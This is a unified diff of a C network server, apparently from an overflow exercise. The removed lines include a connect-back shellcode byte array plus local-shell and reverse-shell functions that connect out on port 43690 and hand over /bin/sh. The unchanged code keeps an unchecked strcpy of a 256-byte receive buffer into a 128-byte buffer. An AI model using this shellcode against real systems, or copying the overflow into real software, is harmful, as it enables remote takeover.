@@ -18,62 +18,6 @@
 #define	BLENGTH	256
 #define	MLENGTH	128
 
-char
-shellcode[] = 
-        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
-        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
-        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
-        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
-        "\x68\x41\x42\x43\x44\x66\x68\xb0"
-        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
-        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
-        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
-        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
-        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
-        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
-        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
-        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
-        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
-        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
-        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
-        "\x01\xcd\x80";
-
-/* Dummy print string*/
-void
-dummy()
-{
-	printf("howdy\n");
-}
-
-void
-localshell(void)
-{
-	char *name[2];
-	/* Initialise */
-	name[0] = "/bin/sh";
-	name[1] = NULL;
-	/* Launch shell */
-	execve(name[0],
-	name, NULL);
-}
-
-int reverseshell()
-{
-                int soc,rc;
-                struct sockaddr_in serv_addr;
-
-                serv_addr.sin_family=2;
-                serv_addr.sin_addr.s_addr=0x0100007f;
-                serv_addr.sin_port=0xAAAA; /* port 43690 */
-                soc=socket(2,1,6);
-                rc = connect(soc, (struct sockaddr *)&serv_addr,0x10);
-                dup2(soc,0);
-                dup2(soc,1);
-                dup2(soc,2);
-                execle("/bin/sh",0,0);
-}
-
-
 /* Read the name of a client */
 static void
 read_name(int s, char *buffer, char *greeting)
@@ -116,13 +60,8 @@ read_message(int s, char *buffer, char *message)
   /* Receive a response from the client */
   recv(s, (void *)buffer, BLENGTH, 0);
 
-  printf("Length of message: %d\n",strlen(buffer));
-
   /* Copy the response to a local buffer */
   strcpy(message, buffer);
-
-  printf("Fin\n");
-
 }
 
 /* Make an introduction */
